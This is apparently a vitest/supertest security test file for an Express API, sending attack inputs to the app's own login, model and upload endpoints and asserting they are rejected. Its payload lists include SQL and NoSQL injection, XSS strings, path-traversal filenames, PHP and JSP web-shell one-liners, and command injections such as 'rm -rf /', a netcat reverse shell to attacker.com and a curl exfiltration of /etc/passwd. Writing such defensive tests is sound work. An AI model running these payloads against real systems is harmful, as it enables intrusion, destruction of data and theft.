import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import { Express } from 'express';
import { createTestApp } from '../setup.js';

describe('Penetration Tests', () => {
  let app: Express;
  let server: any;

  beforeAll(async () => {
    app = await createTestApp();
    server = app.listen(0); // Use random port
  });

  afterAll(async () => {
    if (server) {
      server.close();
    }
  });

  describe('Authentication Security', () => {
    it('should prevent SQL injection in login', async () => {
      const sqlInjectionPayloads = [
        "admin'; DROP TABLE users; --",
        "admin' OR '1'='1",
        "admin' UNION SELECT * FROM users --",
        "admin'; INSERT INTO users VALUES ('hacker', 'password'); --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/auth/login')
          .send({
            username: payload,
            password: 'password'
          });

        expect(response.status).not.toBe(200);
        expect(response.body).not.toHaveProperty('token');
      }
    });

    it('should prevent NoSQL injection in login', async () => {
      const noSqlInjectionPayloads = [
        { $ne: null },
        { $regex: '.*' },
        { $where: 'this.username == this.password' },
        { $gt: '' }
      ];

      for (const payload of noSqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/auth/login')
          .send({
            username: payload,
            password: 'password'
          });

        expect(response.status).not.toBe(200);
        expect(response.body).not.toHaveProperty('token');
      }
    });

    it('should enforce rate limiting on authentication endpoints', async () => {
      const promises = [];
      
      // Send 10 rapid requests
      for (let i = 0; i < 10; i++) {
        promises.push(
          request(app)
            .post('/api/v1/auth/login')
            .send({
              username: 'testuser',
              password: 'wrongpassword'
            })
        );
      }

      const responses = await Promise.all(promises);
      
      // At least some requests should be rate limited
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should prevent brute force attacks', async () => {
      const commonPasswords = [
        'password', '123456', 'admin', 'root', 'test',
        'password123', 'admin123', 'qwerty', 'letmein'
      ];

      let successfulAttempts = 0;
      
      for (const password of commonPasswords) {
        const response = await request(app)
          .post('/api/v1/auth/login')
          .send({
            username: 'admin',
            password: password
          });

        if (response.status === 200) {
          successfulAttempts++;
        }
      }

      // Should not succeed with common passwords
      expect(successfulAttempts).toBe(0);
    });

    it('should validate JWT tokens properly', async () => {
      const invalidTokens = [
        'invalid.token.here',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        '',
        'Bearer ',
        'null',
        'undefined'
      ];

      for (const token of invalidTokens) {
        const response = await request(app)
          .get('/api/v1/models')
          .set('Authorization', `Bearer ${token}`);

        expect(response.status).toBe(401);
      }
    });
  });

  describe('Input Validation Security', () => {
    it('should prevent XSS attacks in model creation', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/v1/models')
          .send({
            name: payload,
            description: payload,
            group: 'test'
          });

        // Should either reject the request or sanitize the input
        if (response.status === 201) {
          expect(response.body.name).not.toContain('<script>');
          expect(response.body.description).not.toContain('<script>');
        }
      }
    });

    it('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(id)',
        '; nc -e /bin/sh attacker.com 4444',
        '| curl http://attacker.com/steal?data=$(cat /etc/passwd)'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/models')
          .send({
            name: `test${payload}`,
            description: 'test',
            group: 'test'
          });

        // Should sanitize or reject malicious input
        expect(response.status).not.toBe(500); // Should not cause server error
        if (response.status === 201) {
          expect(response.body.name).not.toMatch(/[;&|`$()]/);
        }
      }
    });

    it('should validate file uploads properly', async () => {
      const maliciousFiles = [
        { filename: '../../../etc/passwd', content: 'malicious content' },
        { filename: '..\\..\\windows\\system32\\config\\sam', content: 'malicious content' },
        { filename: 'test.php', content: '<?php system($_GET["cmd"]); ?>' },
        { filename: 'test.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { filename: 'test.exe', content: 'MZ\x90\x00\x03\x00\x00\x00' } // PE header
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/v1/artifacts/upload')
          .attach('file', Buffer.from(file.content), file.filename);

        // Should reject malicious files
        expect(response.status).not.toBe(200);
      }
    });
  });

  describe('Authorization Security', () => {
    it('should prevent privilege escalation', async () => {
      // Test with different user roles
      const testCases = [
        { role: 'viewer', endpoint: '/api/v1/models', method: 'POST', shouldFail: true },
        { role: 'viewer', endpoint: '/api/v1/policies', method: 'POST', shouldFail: true },
        { role: 'model_owner', endpoint: '/api/v1/policies', method: 'POST', shouldFail: true },
        { role: 'model_owner', endpoint: '/api/v1/models', method: 'POST', shouldFail: false }
      ];

      for (const testCase of testCases) {
        // Create a token with specific role (mock implementation)
        const token = 'mock-token-' + testCase.role;
        
        const response = await request(app)
          [testCase.method.toLowerCase() as 'get' | 'post']('/api/v1/models')
          .set('Authorization', `Bearer ${token}`)
          .send({ name: 'test', group: 'test' });

        if (testCase.shouldFail) {
          expect(response.status).toBe(403);
        }
      }
    });

    it('should prevent horizontal privilege escalation', async () => {
      // User should not access other users' resources
      const userAToken = 'mock-token-user-a';
      const userBToken = 'mock-token-user-b';

      // User A creates a model
      const createResponse = await request(app)
        .post('/api/v1/models')
        .set('Authorization', `Bearer ${userAToken}`)
        .send({ name: 'user-a-model', group: 'test' });

      if (createResponse.status === 201) {
        const modelId = createResponse.body.id;

        // User B tries to access User A's model
        const accessResponse = await request(app)
          .get(`/api/v1/models/${modelId}`)
          .set('Authorization', `Bearer ${userBToken}`);

        expect(accessResponse.status).toBe(403);
      }
    });
  });

  describe('Data Exposure Security', () => {
    it('should not expose sensitive information in error messages', async () => {
      const response = await request(app)
        .get('/api/v1/nonexistent-endpoint');

      expect(response.status).toBe(404);
      expect(response.body).not.toHaveProperty('stack');
      expect(response.body).not.toHaveProperty('config');
      expect(JSON.stringify(response.body)).not.toMatch(/password|secret|key|token/i);
    });

    it('should not expose database errors', async () => {
      // Try to cause a database error
      const response = await request(app)
        .post('/api/v1/models')
        .send({
          name: 'a'.repeat(1000), // Potentially too long
          group: 'test'
        });

      if (response.status >= 400) {
        expect(JSON.stringify(response.body)).not.toMatch(/sql|database|postgres|connection/i);
      }
    });

    it('should not expose internal paths in responses', async () => {
      const response = await request(app)
        .get('/api/v1/models/nonexistent');

      expect(JSON.stringify(response.body)).not.toMatch(/\/home|\/var|\/etc|C:\\|node_modules/);
    });
  });

  describe('Session Security', () => {
    it('should invalidate sessions properly', async () => {
      // Login to get a session
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          username: 'testuser',
          password: 'testpassword'
        });

      if (loginResponse.status === 200) {
        const token = loginResponse.body.token;

        // Logout
        await request(app)
          .post('/api/v1/auth/logout')
          .set('Authorization', `Bearer ${token}`);

        // Try to use the token after logout
        const response = await request(app)
          .get('/api/v1/models')
          .set('Authorization', `Bearer ${token}`);

        expect(response.status).toBe(401);
      }
    });

    it('should handle concurrent sessions properly', async () => {
      const loginPromises = [];
      
      // Create multiple concurrent sessions
      for (let i = 0; i < 5; i++) {
        loginPromises.push(
          request(app)
            .post('/api/v1/auth/login')
            .send({
              username: 'testuser',
              password: 'testpassword'
            })
        );
      }

      const responses = await Promise.all(loginPromises);
      const successfulLogins = responses.filter(res => res.status === 200);

      // Should handle concurrent logins gracefully
      expect(successfulLogins.length).toBeGreaterThan(0);
    });
  });

  describe('API Security', () => {
    it('should enforce HTTPS in production', async () => {
      // Check security headers
      const response = await request(app)
        .get('/api/v1/health');

      expect(response.headers).toHaveProperty('strict-transport-security');
      expect(response.headers).toHaveProperty('x-content-type-options');
      expect(response.headers).toHaveProperty('x-frame-options');
    });

    it('should prevent CSRF attacks', async () => {
      // Test without CSRF token
      const response = await request(app)
        .post('/api/v1/models')
        .set('Origin', 'http://malicious-site.com')
        .send({ name: 'test', group: 'test' });

      // Should reject cross-origin requests without proper headers
      expect(response.status).toBe(403);
    });

    it('should validate API versioning', async () => {
      const response = await request(app)
        .get('/api/v999/models');

      expect(response.status).toBe(404);
    });
  });

  describe('Denial of Service Protection', () => {
    it('should handle large payloads gracefully', async () => {
      const largePayload = {
        name: 'a'.repeat(10000),
        description: 'b'.repeat(50000),
        metadata: {}
      };

      // Fill metadata with large data
      for (let i = 0; i < 1000; i++) {
        largePayload.metadata[`key${i}`] = 'x'.repeat(100);
      }

      const response = await request(app)
        .post('/api/v1/models')
        .send(largePayload);

      // Should reject or handle large payloads gracefully
      expect(response.status).toBe(413); // Payload too large
    });

    it('should handle deeply nested objects', async () => {
      let deepObject: any = {};
      let current = deepObject;

      // Create deeply nested object
      for (let i = 0; i < 1000; i++) {
        current.nested = {};
        current = current.nested;
      }

      const response = await request(app)
        .post('/api/v1/models')
        .send({
          name: 'test',
          group: 'test',
          metadata: deepObject
        });

      // Should handle deep nesting gracefully
      expect(response.status).not.toBe(500);
    });

    it('should handle rapid requests', async () => {
      const promises = [];
      
      // Send 100 rapid requests
      for (let i = 0; i < 100; i++) {
        promises.push(
          request(app)
            .get('/api/v1/health')
        );
      }

      const responses = await Promise.all(promises);
      
      // Should handle all requests without crashing
      const errorResponses = responses.filter(res => res.status >= 500);
      expect(errorResponses.length).toBe(0);
    });
  });

  describe('Information Disclosure', () => {
    it('should not expose server information', async () => {
      const response = await request(app)
        .get('/api/v1/health');

      expect(response.headers).not.toHaveProperty('server');
      expect(response.headers).not.toHaveProperty('x-powered-by');
    });

    it('should not expose debug information', async () => {
      const response = await request(app)
        .get('/api/v1/debug');

      expect(response.status).toBe(404);
    });

    it('should handle OPTIONS requests securely', async () => {
      const response = await request(app)
        .options('/api/v1/models');

      // Should not expose sensitive information in OPTIONS
      expect(response.headers['access-control-allow-methods']).not.toContain('TRACE');
      expect(response.headers['access-control-allow-methods']).not.toContain('CONNECT');
    });
  });
});